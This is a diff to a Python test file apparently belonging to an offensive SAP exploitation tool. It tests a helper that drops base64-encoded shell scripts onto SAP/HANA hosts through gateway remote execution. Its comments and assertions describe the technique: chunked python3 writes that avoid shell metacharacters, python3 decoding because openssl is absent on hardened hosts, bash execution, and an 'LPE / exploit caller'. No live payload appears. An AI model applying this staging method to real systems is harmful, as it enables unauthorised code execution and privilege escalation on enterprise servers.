@@ -522,41 +522,93 @@ def _fake_gw_exec_recorder():
     """A fake GwExecFn that records (program, args) calls and replies
     success with empty output (or a per-program-overrideable result).
 
-    Built-in async-friendly behaviour: the /bin/cat call returns the
-    DONE-sentinel output by default so the helper's polling loop
-    exits on the first poll.  Tests that need to simulate a slow
-    worker can override `canned["/bin/cat"]`."""
+    Built-in async-friendly behaviour, tuned so ``chunked_drop_and_run``
+    completes end-to-end without a real target:
+
+      * ``/bin/cat /etc/hostname`` → returns a hostname line so the
+        python3 probe's readback canary succeeds
+      * ``/bin/cat`` (any other path) → returns the DONE sentinel so
+        the async polling loop exits on the first poll
+      * ``/bin/ls /usr/bin/python3`` → returns the path itself so the
+        probe's first candidate wins (no need to walk the fallback list)
+      * ``/bin/ls`` (any other path) → returns "cannot access" so
+        subsequent candidates are rejected
+
+    Tests can override any of these via ``canned["<program>"]`` or the
+    more granular ``canned_by_args[(program, args)]``.  ``canned``
+    matches by program name only (like before); ``canned_by_args``
+    lets tests distinguish e.g. the hostname cat from the result-file
+    cat.  When a canned entry exists for both, the argv-specific
+    one wins."""
     from sap_dpmon_sapstar import _DONE_SENTINEL
     calls = []
-    canned = {}  # {program: dict-result}
+    canned = {}          # {program: dict-result}
+    canned_by_args = {}  # {(program, args): dict-result}
 
     def gw_exec(program, args):
         calls.append((program, args))
+        key = (program, args)
+        if key in canned_by_args:
+            return canned_by_args[key]
         if program in canned:
             return canned[program]
-        # Default: every other program returns success+empty.
-        # /bin/cat returns the DONE sentinel so the polling loop
-        # in chunked_drop_and_run exits immediately.
         if program == "/bin/cat":
+            # Canary: /etc/hostname must return SOMETHING so the
+            # readback-channel-alive check passes.
+            if args == "/etc/hostname":
+                return {"success": True,
+                        "output": ["s4hanadev.example"],
+                        "error": ""}
+            # Any other cat is treated as a result-file poll — return
+            # DONE so the polling loop exits immediately.
             return {"success": True,
                     "output": [_DONE_SENTINEL],
                     "error": ""}
+        if program == "/bin/ls":
+            # First-candidate python3 discovery: /usr/bin/python3 wins.
+            # /hana/shared/ enumeration returns empty (no HDB visible
+            # in the fake), so the probe falls back to the ABAP SID
+            # branch but /usr/bin/python3 satisfies before any HANA
+            # path is tried.
+            if args == "/usr/bin/python3":
+                return {"success": True,
+                        "output": ["/usr/bin/python3"],
+                        "error": ""}
+            return {"success": True,
+                    "output": [f"ls: cannot access '{args}': "
+                               f"No such file or directory"],
+                    "error": ""}
+        # Default: every other program returns success+empty.
         return {"success": True, "output": [], "error": ""}
 
     gw_exec.calls = calls
     gw_exec.canned = canned
+    gw_exec.canned_by_args = canned_by_args
     return gw_exec
 
 
 def test_chunked_drop_and_run_uses_python3_for_chunks():
-    """Each base64 chunk must be written via python3 -c open(...).write(...)
-    — that's the no-shell-metacharacter pattern."""
+    """Each base64 chunk must be written via <python3> -c open(...).write(...)
+    — that's the no-shell-metacharacter pattern.
+
+    The exact python3 binary path is DISCOVERED at call time (via
+    _probe_python3_via_exec_fn) rather than being hardcoded to bare
+    "python3"; the fake recorder makes /usr/bin/python3 the winning
+    candidate so we assert on that path here."""
     from sap_dpmon_sapstar import chunked_drop_and_run
     gw = _fake_gw_exec_recorder()
     chunked_drop_and_run(gw, "echo hello world | wc -l")
-    python_calls = [c for c in gw.calls if c[0] == "python3"]
+    # Match by suffix so this test survives a change to the candidate
+    # list ordering (e.g. if a HANA-shipped path becomes preferred on
+    # some future recorder configuration).  Also filter to the write
+    # pattern so we don't confuse the b64decode call with a chunk
+    # write.
+    python_calls = [(p, a) for p, a in gw.calls
+                    if p.endswith("python3") and a.startswith("-c open(")
+                    and ".write(b'" in a]
     assert python_calls, (
-        "Helper must call python3 to drop the base64 in chunks")
+        "Helper must call a discovered python3 binary to drop the "
+        "base64 in chunks with the -c open().write() pattern")
     # Each python3 call's args must use the open()/.write() pattern
     for prog, args in python_calls:
         assert args.startswith("-c open("), (
@@ -572,21 +624,38 @@ def test_chunked_drop_and_run_uses_python3_for_chunks():
             f"chunk must contain only base64 chars: {chunk!r}")
 
 
-def test_chunked_drop_and_run_uses_openssl_to_decode():
-    """The decode step must use openssl with the -A flag (single-line
-    base64 acceptance)."""
+def test_chunked_drop_and_run_uses_python3_to_decode():
+    """The decode step must reuse the discovered python3 (NOT openssl,
+    which is often absent on hardened HANA appliances) via a base64
+    one-liner that mirrors the pattern used by the HANA wrapper
+    writer in sap_db_sql_writers._write_hana_wrapper_via_gw.
+
+    Regression guard for the "openssl not installed on target"
+    silent-failure mode: the previous implementation ran
+    /usr/bin/openssl to decode the base64 payload; SAPXPG's
+    "launched" ack fired even when openssl was missing, so the .sh
+    file was never written and every subsequent SQL step failed
+    with 'sh: /tmp/sapmap_dp_XXX.sh: No such file or directory'."""
     from sap_dpmon_sapstar import chunked_drop_and_run
     gw = _fake_gw_exec_recorder()
     chunked_drop_and_run(gw, "test command")
     openssl_calls = [c for c in gw.calls if c[0] == "/usr/bin/openssl"]
-    assert openssl_calls, "Helper must invoke /usr/bin/openssl"
-    _prog, args = openssl_calls[0]
-    assert "enc" in args
-    assert "-d" in args
-    assert "-base64" in args
-    assert "-A" in args, (
-        "openssl must use -A for single-line base64 input "
-        "(without it, output is silently empty)")
+    assert not openssl_calls, (
+        "Helper must NOT invoke openssl any more — "
+        "it's frequently missing on hardened SAP hosts")
+    py_calls = [(prog, args) for prog, args in gw.calls
+                if prog.endswith("python3") and ".sh" in args
+                and "base64" in args and "b64decode" in args]
+    assert py_calls, (
+        "Helper must run one python3 call whose -c one-liner writes "
+        "the .sh file via base64.b64decode() of the .b64 blob")
+    _prog, args = py_calls[0]
+    # Round-trip sanity: parseable structure — .b64 in, .sh out
+    assert ".b64" in args and ".sh" in args
+    # The .sh path is what /bin/bash will exec — must be the write
+    # target of the b64decode expression
+    assert "open('/tmp/sapmap_dp_" in args
+    assert ".write(__import__('base64').b64decode" in args
 
 
 def test_chunked_drop_and_run_executes_via_bash_file():
@@ -705,10 +774,14 @@ def test_chunked_drop_and_run_raises_on_timeout():
 
 def test_chunked_drop_and_run_raises_on_chunk_failure():
     """If any python3 chunk write fails, the helper must raise
-    RuntimeError so the LPE / exploit caller can fall through."""
+    RuntimeError so the LPE / exploit caller can fall through.
+
+    The recorder's default probe picks /usr/bin/python3 as the
+    discovered binary, so we canned-fail the exact path chunk_
+    drop_and_run passes back to gw_exec."""
     from sap_dpmon_sapstar import chunked_drop_and_run
     gw = _fake_gw_exec_recorder()
-    gw.canned["python3"] = {
+    gw.canned["/usr/bin/python3"] = {
         "success": False,
         "output": [],
         "error": "permission denied",
